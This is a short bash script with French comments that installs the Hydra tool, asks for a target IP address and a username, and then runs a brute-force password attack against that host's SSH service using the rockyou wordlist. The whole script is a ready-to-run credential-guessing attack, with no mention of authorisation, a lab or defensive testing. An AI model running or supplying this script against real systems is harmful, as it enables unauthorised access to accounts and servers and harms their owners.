#!/bin/bash

# Installer Hydra
sudo apt update
sudo apt install hydra -y

# Exécuter Hydra pour une attaque de force brute sur SSH
echo "Entrez l'IP de la cible :"
read target_ip
echo "Entrez le nom d'utilisateur :"
read username

hydra -l $username -P /usr/share/wordlists/rockyou.txt ssh://$target_ip

echo "Attaque par force brute sur SSH avec Hydra terminée."